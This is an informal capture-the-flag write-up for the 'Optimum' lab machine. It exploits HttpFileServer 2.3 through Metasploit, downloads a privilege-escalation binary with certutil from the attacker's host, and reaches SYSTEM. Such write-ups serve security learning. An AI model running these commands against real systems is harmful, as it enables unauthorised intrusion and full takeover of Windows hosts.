# OPTIMUM

HttpFileServer 2.3

Found this exploit 
```
https://www.exploit-db.com/exploits/49584
```

we have a shell here and the user.txt as we are
```
optimum\kostas S-1-5-21-605891470-2991919448-81205106-1001
```

systeminfo give us : OS Name: Microsoft Windows Server 2012 R2 Standard
so we now know we can use this exploit 
```
https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41020.exe
```
download it with 
```
certutil -urlcache -split -f "http://10.10.14.28:8000/41020.exe" 41020.exe
```

unfortunately using it with our shell doesnt work 

fuck it lets go to msfconsole
```
search HttpFileServer
use exploit/windows/http/rejetto_hfs_exec
set rhosts 10.10.10.8
set lhost 10.10.14.28
exploit 
ctrl + z
upload 41020.exe
41020.exe
```
```
C:\Users\kostas\Desktop>whoami
whoami
nt authority\system
```

i dont know why this is not working with my other shell
